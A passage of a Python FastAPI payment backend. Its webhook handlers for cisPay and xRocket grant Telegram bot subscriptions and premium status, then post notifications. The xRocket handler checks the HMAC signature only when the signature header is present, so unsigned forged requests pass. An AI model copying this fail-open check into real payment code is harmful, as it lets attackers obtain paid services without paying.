            amount_rub = amount_kopecks // 100
            msg_text = f"✅ *Подписка активирована\\!*\n*└─ Действует до: {new_date_str}*"
            log_text = f"💳 *cisPay СБП* {uid} · {amount_rub} ₽ · до {new_date_str}"

    user_tok = await _get_notify_token(uid)
    sent = False
    if BOT_TOKEN:
        sent = await _tg_send(BOT_TOKEN, uid, msg_text)
    if not sent and user_tok and user_tok != BOT_TOKEN:
        await _tg_send(user_tok, uid, msg_text)

    async with aiohttp.ClientSession() as s:
        try:
            tok = BOT_TOKEN or user_tok
            await s.post(
                f"https://api.telegram.org/bot{tok}/sendMessage",
                json={"chat_id": BOT_LOGS, "text": log_text, "parse_mode": "Markdown"},
                timeout=aiohttp.ClientTimeout(total=5)
            )
        except Exception as e:
            log.warning(f"[cispay-webhook] bot_logs notify failed: {e}")

    log.info(f"[cispay-webhook] granted st={st} days={sub_days} uid={uid} tx={transaction_id}")
    return {"ok": True}


@app.post("/xrocket/webhook")
async def xrocket_webhook(request: Request):
    raw = await request.body()
    # Pay API: HMAC-SHA256(raw_body, webhook_token) в заголовке X-Rocket-Signature
    sig_header = request.headers.get("X-Rocket-Signature", "")
    token = XROCKET_WEBHOOK_TOKEN or XROCKET_API_KEY
    if token and sig_header:
        expected = hmac.new(token.encode(), raw, hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expected, sig_header):
            log.warning("[xrocket-webhook] invalid signature")
            raise HTTPException(status_code=403, detail="bad signature")

    try:
        data = json.loads(raw)
    except Exception:
        raise HTTPException(status_code=400, detail="invalid json")

    print(f"[xrocket-webhook] raw={raw[:500]}", flush=True)

    # Pay API structure: {"data": {"event": "...", "invoice": {...}, "payment": {...}}, ...}
    inner = data.get("data", data)
    invoice = inner.get("invoice", inner)
    payment = inner.get("payment", {})

    status = invoice.get("status") or payment.get("status")
    if status != "paid":
        log.warning(f"[xrocket-webhook] status={status}, skip")
        return {"ok": True}

    # clientInvoiceId holds our payload string
    payload = invoice.get("clientInvoiceId", "") or invoice.get("payload", "")
    transaction_id = str(payment.get("id") or invoice.get("id") or payload)
    parts = payload.split("_")

    # ─── Кейс через xRocket ──────────────────────────────────────────────────
    if len(parts) >= 3 and parts[0] == "case" and parts[1] == "xrocket":
        try:
            uid = int(parts[2])
        except ValueError:
            log.warning(f"[xrocket-webhook] bad uid in case payload: {payload}")
            return {"ok": True}
        async with pool.acquire() as conn:
            existing = await conn.fetchval("SELECT 1 FROM cases WHERE invoice_id=$1", transaction_id)
            if existing:
                log.info(f"[xrocket-webhook] duplicate case tx={transaction_id}")
                return {"ok": True}
            await conn.execute(
                "INSERT INTO cases (user_id, invoice_id) VALUES ($1,$2) ON CONFLICT DO NOTHING",
                uid, transaction_id
            )
        msg_text = "🎁 *Кейс успешно добавлен\\!*\n\nОткройте его в разделе Кейсы\\."
        log_text = f"🛒 *xRocket кейс* · uid={uid} · tx={transaction_id}"
        user_tok = await _get_notify_token(uid)
        if BOT_TOKEN:
            await _tg_send(BOT_TOKEN, uid, msg_text)
        async with aiohttp.ClientSession() as s:
            try:
                await s.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN or user_tok}/sendMessage",
                    json={"chat_id": BOT_LOGS, "text": log_text, "parse_mode": "Markdown"},
                    timeout=aiohttp.ClientTimeout(total=5)
                )
            except Exception as e:
                log.warning(f"[xrocket-webhook] case bot_logs notify failed: {e}")
        log.info(f"[xrocket-webhook] case granted uid={uid} tx={transaction_id}")
        return {"ok": True}

    # ─── Подписка через xRocket ──────────────────────────────────────────────
    if len(parts) < 3 or parts[0] != "xrocket":
        log.warning(f"[xrocket-webhook] unknown payload format: {payload}")
        return {"ok": True}

    try:
        uid = int(parts[1])
    except ValueError:
        log.warning(f"[xrocket-webhook] bad uid in payload: {payload}")
        return {"ok": True}

    st = parts[2]
    sub_days = _YM_SUB_DAYS.get(st)
    if sub_days is None:
        log.warning(f"[xrocket-webhook] unknown sub type: {st}")
        return {"ok": True}

    amount_usdt = invoice.get("priceAmount", 0) or payment.get("payAmount", 0)

    async with pool.acquire() as conn:
        inserted = await conn.fetchval(
            "INSERT INTO paid_invoices (invoice_id, user_id, created_at) VALUES ($1,$2,NOW()) ON CONFLICT DO NOTHING RETURNING invoice_id",
            transaction_id, uid
        )
        if not inserted:
            log.info(f"[xrocket-webhook] duplicate transaction_id={transaction_id}, skip")
            return {"ok": True}

        if st == "premupgrade":
            await conn.execute("UPDATE users SET premium=1 WHERE user_id=$1", uid)
            msg_text = "✅ *Ваш Premium активирован\\!*"
            log_text = f"🚀 *Premium* via xRocket · {uid}"
        else:
            current = await conn.fetchval("SELECT subscribe FROM users WHERE user_id=$1", uid)
            now = datetime.now()
            base = current if current and current > now else now
            new_date = base + timedelta(days=sub_days)
            await conn.execute(
                "UPDATE users SET subscribe=$1, sub_expiry_notified=FALSE WHERE user_id=$2",
                new_date, uid
            )
            new_date_str = new_date.strftime("%Y-%m-%d %H:%M:%S")
            msg_text = f"✅ *Подписка активирована\\!*\n*└─ Действует до: {new_date_str}*"
            log_text = f"🚀 *xRocket* {uid} · {amount_usdt} USDT · до {new_date_str}"

    user_tok = await _get_notify_token(uid)
    sent = False
    if BOT_TOKEN:
        sent = await _tg_send(BOT_TOKEN, uid, msg_text)
    if not sent and user_tok and user_tok != BOT_TOKEN:
        await _tg_send(user_tok, uid, msg_text)

    async with aiohttp.ClientSession() as s:
        try:
            tok = BOT_TOKEN or user_tok
            await s.post(
                f"https://api.telegram.org/bot{tok}/sendMessage",
                json={"chat_id": BOT_LOGS, "text": log_text, "parse_mode": "Markdown"},
                timeout=aiohttp.ClientTimeout(total=5)
            )
        except Exception as e:
            log.warning(f"[xrocket-webhook] bot_logs notify failed: {e}")

    log.info(f"[xrocket-webhook] granted st={st} days={sub_days} uid={uid} tx={transaction_id}")
    return {"ok": True}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
